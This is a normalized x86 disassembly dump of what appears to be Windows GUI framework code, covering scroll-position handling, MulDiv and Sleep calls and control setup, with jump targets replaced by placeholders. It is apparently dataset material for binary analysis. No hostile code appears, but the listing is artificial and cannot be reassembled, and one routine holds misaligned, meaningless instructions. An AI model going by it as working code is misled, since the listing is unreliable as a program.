mov eax [ ebp - 0x4 ]
call sub_45a27c
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
push ebp
call sub_459eac
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
push ebp
call sub_459eac
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406d80
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
sub_45a204
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_45a8f4
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_45a27c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_4493d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_4493d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_448f58
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_448f58
jmp r-xdata
call sub_4599ec
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_45a340
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_45a8f4
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_45a3f8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4493d8
push eax
call sub_42cc50
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4493d8
push eax
call sub_42cc50
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4493d8
push eax
call sub_42cc50
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_4235e4
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4493d8
push eax
call sub_42cc50
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4493d8
push eax
call sub_42cc50
sub_45a500
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_459e14
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_459e14
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_45a3f8
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4493d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_45a27c
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_459e14
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_45a618
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4450cc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_459a94
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_459a94
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_45a690
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403234
mov eax [ esi + 0x20c ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4451f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_45a6dc
push ebx
mov ebx eax
mov eax ebx
call sub_446358
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_45a8f4
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40c240
test al al
jne r-xdata
mov eax ebx
call sub_4493d8
push eax
call sub_42cc84
sub_45a71c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a874
mov ecx edi
mov edx esi
mov eax ebx
call sub_445aa0
pop edi
pop esi
pop ebx
retn
sub_45a75c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45a864
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4425bc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_459d2c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_4460d0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_45a27c
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446094
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446094
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_41a30c
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_442328
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a86b
mov eax [ ebp - 0x10 ]
call sub_403234
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_459b74
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_41a468
xor ecx ecx
mov edx 0xb03e
call sub_443d6c
inc ebx
dec esi
jne r-xdata
sub_45a898
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_45a3cc
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_45a3cc
mov eax ebx
call sub_45a874
jmp r-xdata
sub_45a8f4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4496dc
test al al
je r-xdata
xor eax eax
push ebp
push sub_45a9df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_459e94
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_459e94
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_45a500
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_45a500
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_45a500
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_45a500
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_45a500
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_45a500
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_45aa04
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_4426d0
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4426fc
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_4426d0
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4426fc
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_4425bc
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_45a27c
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_4425bc
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_442600
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_45a27c
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_4425bc
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_45a27c
mov eax ebx
call sub_4425bc
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_442600
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_442600
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_45a27c
mov eax ebx
call sub_442600
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_45ab58
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_45a27c
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_45a27c
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_45a3cc
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_45a3cc
sub_45abfc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45ab58
mov ecx edi
mov edx esi
mov eax ebx
call sub_448eac
pop edi
pop esi
pop ebx
retn
sub_45ac24
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_45ac8e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44798c
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ac95
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_45ac95
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_45accd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45a874
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45acd4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_45acd4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45a8f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_45ad48
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_442600
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_42b030
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_4425bc
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_42b030
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_41905c
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_44540c
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45adb8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45ae19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4033c0
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44871c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ae20
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_45ae48
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45afac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_45af8c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_40317c
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_403558
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45af93
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_45af54
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41a228
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403184
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
sub_45afd4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403430
and [ ebx + 0x2f4 ] 0xdf
sub_45b00c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_45a618
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_442328
xor edx edx
mov eax ebx
call sub_44234c
mov edx 0x140
mov eax ebx
call sub_442374
mov edx 0xf0
mov eax ebx
call sub_442398
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a5c4
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_45b928
mov dl 0x1
mov eax [ r-xdata ]
call sub_4243c0
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_441794
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_40317c
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_45bc8c
xor edx edx
mov eax ebx
call sub_442d7c
xor edx edx
mov eax ebx
call sub_442ce4
mov dl 0x1
mov eax ebx
call sub_449518
mov edx ebx
mov eax [ rw-data ]
call sub_4602f0
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_45b185
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_4209b4
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_41a604
xor edx edx
mov eax ebx
call sub_41d430
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_45f198
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_45b1f0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035c0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_45b2ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45db14
mov eax [ ebp - 0x4 ]
call sub_4496dc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_460328
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403234
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403234
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d524
mov dl [ ebp - 0x5 ]
and dl 0xfc
